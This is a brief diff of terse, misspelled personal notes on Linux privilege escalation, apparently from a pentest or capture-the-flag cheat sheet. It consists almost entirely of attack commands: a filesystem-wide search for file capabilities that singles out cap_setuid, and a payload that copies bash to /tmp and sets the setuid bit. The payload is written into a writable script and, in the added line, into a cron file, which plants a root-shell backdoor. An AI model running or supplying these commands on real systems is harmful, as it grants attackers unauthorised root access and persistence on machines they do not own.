@@ -6,3 +6,4 @@ getcap -r / 2>/dev/null (capalities huntinig permit anything)
 note:cap_setuid+ep(permit anything)
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/oerwrite.sh
 
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >  file of ctontab
